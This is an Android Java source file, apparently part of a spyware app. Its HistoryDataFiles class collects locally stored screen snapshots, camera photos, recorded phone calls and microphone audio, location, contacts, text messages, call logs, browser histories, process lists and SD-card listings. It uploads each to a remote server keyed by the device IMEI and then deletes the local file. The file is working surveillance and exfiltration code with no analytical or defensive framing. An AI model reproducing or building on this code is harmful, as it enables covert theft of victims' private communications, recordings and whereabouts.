package com.main;

import java.io.File;
import java.io.FileInputStream;

import com.network.Network;
import com.network.SendDataToServer;
import com.phone.data.AppMessage;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;

import android.content.Context;
import android.util.Log;

public class HistoryDataFiles implements Runnable{

	private final String TAG = "HistoryDataFiles";
	private Context context;

	
	public HistoryDataFiles(Context context){
		this.context = context;
	}

	
	public void uploadOldFiles(String path){
    	try{
    		
    		Log.e(TAG, "start");
        	if( Network.isNetworkConnected(context) == false ){
        		return;
        	}
    		
			File pathfile = new File(path);
			if (pathfile.exists() == false) {
				return;
			}
			
	        File[] subFiles = pathfile.listFiles();
	        if (subFiles == null) {
				return;
			}
	        
	        for (File subFile : subFiles) {
	            if(subFile.isFile() ){
	            	if (subFile.getName().contains(ForegroundService.SCRNSNAPSHOT_FILE_NAME)) {
	            		
	        			String filename = subFile.getName();
						int filenamelen = filename.getBytes().length;
						int filesize = (int)subFile.length();
						int sendsize = filesize + 4 + filenamelen + 4;
						byte[] sendbuf = new byte[sendsize];
						byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
						System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
						System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
						byte[] bytefilesize = PublicFunction.intToBytes(filesize);
						System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
						
	            		FileInputStream fin = new FileInputStream(subFile);
	            		fin.read(sendbuf,4 + filenamelen + 4,filesize);
	            		fin.close();
	            		
	            		SendDataToServer.sendDataToServer(sendbuf,sendsize, Public.CMD_DATA_SCRNSNAPSHOT, Public.IMEI);
	            		WriteDateFile.writeLogFile("find history screensnapshot file:" + subFile.getName() + "\r\n");
	            		subFile.delete();
					}
	            	else if (subFile.getName().contains(ForegroundService.CAMERAPHOTO_FILE_NAME)) {
	            		
	        			String filename = subFile.getName();
						int filenamelen = filename.getBytes().length;
						int filesize = (int)subFile.length();
						int sendsize = filesize + 4 + filenamelen + 4;
						byte[] sendbuf = new byte[sendsize];
						byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
						System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
						System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
						byte[] bytefilesize = PublicFunction.intToBytes(filesize);
						System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
						
	            		FileInputStream fin = new FileInputStream(subFile);
	            		fin.read(sendbuf,4 + filenamelen + 4,filesize);
	            		fin.close();

	            		SendDataToServer.sendDataToServer(sendbuf,sendsize, Public.CMD_DATA_CAMERAPHOTO, Public.IMEI);
	            		WriteDateFile.writeLogFile("find history cameraphoto file:" + subFile.getName() + "\r\n");
	            		subFile.delete();
					}            	
	            	else if (subFile.getName().contains(ForegroundService.PHONECALLAUDIO_FILE_NAME) ) {
	            		int filesize = (int)subFile.length();
						int filenamelen = subFile.getName().getBytes().length;
						int sendsize = filesize + 4 + filenamelen +4;
						byte[] sendbuf = new byte[sendsize];
						byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
						System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
						System.arraycopy(subFile.getName().getBytes(), 0, sendbuf, 4, filenamelen);
						byte[] bytefilesize = PublicFunction.intToBytes(filesize);
						System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
	            		
						FileInputStream fin = new FileInputStream(subFile);
						fin.read(sendbuf,4 + filenamelen + 4,filesize);
						fin.close();

	            		SendDataToServer.sendDataToServer(sendbuf,sendsize, Public.CMD_DATA_PHONECALLAUDIO, Public.IMEI);
	            		WriteDateFile.writeLogFile("find history phonecallaudio file:" + subFile.getName() + "\r\n");
	            		subFile.delete();
					}
	            	else if (subFile.getName().contains(ForegroundService.LOCATION_FILE_NAME) ) {
	            		int filesize = (int)subFile.length();
						int sendsize = filesize;
						byte[] sendbuf = new byte[sendsize];
						FileInputStream fin = new FileInputStream(subFile);
						fin.read(sendbuf,0,filesize);
						fin.close();

	            		SendDataToServer.sendDataToServer(sendbuf,sendsize, Public.CMD_DATA_LOCATION, Public.IMEI);
	            		WriteDateFile.writeLogFile("find location file:" + subFile.getName() + "\r\n");
	            		subFile.delete();
					}
	            	else if (subFile.getName().contains(ForegroundService.MICAUDIORECORD_FILE_NAME) ) {
	            		int filesize = (int)subFile.length();
						int filenamelen = subFile.getName().getBytes().length;
						int sendsize = filesize + 4 + filenamelen +4;
						byte[] sendbuf = new byte[sendsize];
						byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
						System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
						System.arraycopy(subFile.getName().getBytes(), 0, sendbuf, 4, filenamelen);
						byte[] bytefilesize = PublicFunction.intToBytes(filesize);
						System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
	            		
						FileInputStream fin = new FileInputStream(subFile);
						fin.read(sendbuf,4 + filenamelen + 4,filesize);
						fin.close();

	            		SendDataToServer.sendDataToServer(sendbuf,sendsize, Public.CMD_DATA_MICAUDIORECORD, Public.IMEI);
	            		WriteDateFile.writeLogFile("find history mic audio record file:" + subFile.getName() + "\r\n");
	            		subFile.delete();
					}else if (subFile.getName().contains(ForegroundService.DEVICEINFO_FILE_NAME) ||
						subFile.getName().contains(ForegroundService.CONTACTS_FILE_NAME) || 
						subFile.getName().contains(ForegroundService.MESSAGE_FILE_NAME) || 
						subFile.getName().contains(ForegroundService.CALLLOG_FILE_NAME) || 
						subFile.getName().contains(ForegroundService.WEBKITRECORD_FILE_NAME) || 
						subFile.getName().contains(ForegroundService.CHROMEHISTORY_FILE_NAME) || 
						subFile.getName().contains(ForegroundService.FIREFOXRECORD_FILE_NAME) ||
						subFile.getName().contains(ForegroundService.APPPROCESS_FILE_NAME) ||
						subFile.getName().contains(ForegroundService.SDCARDFILES_NAME) ||
						subFile.getName().contains(ForegroundService.EXTCARDFILES_NAME)){
						
						int cmd = 0;
						if (subFile.getName().contains(ForegroundService.CONTACTS_FILE_NAME)) {
							cmd = Public.CMD_DATA_CONTACTS;
						}else if (subFile.getName().contains(ForegroundService.DEVICEINFO_FILE_NAME)) {
							cmd = Public.CMD_DATA_DEVICEINFO;
						}else if (subFile.getName().contains(ForegroundService.MESSAGE_FILE_NAME)) {
							cmd = Public.CMD_DATA_MESSAGE;
						}else if (subFile.getName().contains(ForegroundService.CALLLOG_FILE_NAME)) {
							cmd = Public.CMD_DATA_CALLLOG;
						}else if (subFile.getName().contains(ForegroundService.WEBKITRECORD_FILE_NAME)) {
							cmd = Public.CMD_DATA_WEBKITHISTORY;
						}else if (subFile.getName().contains(ForegroundService.CHROMEHISTORY_FILE_NAME)) {
							cmd = Public.CMD_DATA_CHROMEHISTORY;
						}else if (subFile.getName().contains(ForegroundService.FIREFOXRECORD_FILE_NAME)) {
							cmd = Public.CMD_DATA_FIREFOXHISTORY;
						}else if (subFile.getName().contains(ForegroundService.APPPROCESS_FILE_NAME)) {
							cmd = Public.CMD_DATA_APPPROCESS;
						}else if (subFile.getName().endsWith(ForegroundService.SDCARDFILES_NAME) && 
								subFile.getName().endsWith(".tmp") == false) {
			            	//NetworkLargeFile.SendNetworkLargeFile(subFile.getAbsolutePath(),Public.SERVER_IP_ADDRESS,
			            	//		Public.SERVER_DATA_PORT,imei,ServiceThreadProc.CMD_DATA_SDCARDFILES,Public.PacketOptCompInFile);
							cmd = Public.CMD_DATA_SDCARDFILES;
						}else if (subFile.getName().endsWith(ForegroundService.EXTCARDFILES_NAME) &&
								subFile.getName().endsWith(".tmp") == false) {
							cmd = Public.CMD_DATA_EXTCARDFILES;
			            	//NetworkLargeFile.SendNetworkLargeFile(subFile.getAbsolutePath(),Public.SERVER_IP_ADDRESS,
			            	//		Public.SERVER_DATA_PORT,imei,ServiceThreadProc.CMD_DATA_EXTCARDFILES,Public.PacketOptCompInFile);
						}
						else if(subFile.getName().contains(ForegroundService.LOG_FILE_NAME)){
							cmd = Public.CMD_UPLOAD_LOG;
						}
						else  {
							continue;
						}
						
	            		int filesize = (int)subFile.length();
						int sendsize = filesize;
						byte[] sendbuf = new byte[sendsize];
						FileInputStream fin = new FileInputStream(subFile);
						fin.read(sendbuf,0,filesize);
						fin.close();
	            		SendDataToServer.sendDataToServer(sendbuf,sendsize, cmd, Public.IMEI);
	            		WriteDateFile.writeLogFile("find history file:" + subFile.getName() + "\r\n");
	            		subFile.delete();
					}
	            }
	        }
    	}catch(Exception ex){
    		ex.printStackTrace();
			String errorString = ExceptionProcess.getExceptionDetail(ex);
			String stackString = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("sendHistoryDataFiles exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
    	}
	}
	
	
    public void run(){
    	if (ForegroundService.LOCAL_PATH_NAME == null || ForegroundService.LOCAL_PATH_NAME.equals("")) {
			Public.init(context);
		}
    	
    	if (ForegroundService.LOCAL_PATH_NAME.equals(ForegroundService.SDCARD_PATH_NAME) == false) {
    		uploadOldFiles(ForegroundService.SDCARD_PATH_NAME);
    		uploadOldFiles(ForegroundService.LOCAL_PATH_NAME);
		}else{
			uploadOldFiles(ForegroundService.LOCAL_PATH_NAME);
		}
    	
    	AppMessage.UploadAppMsgFile();
    }
}
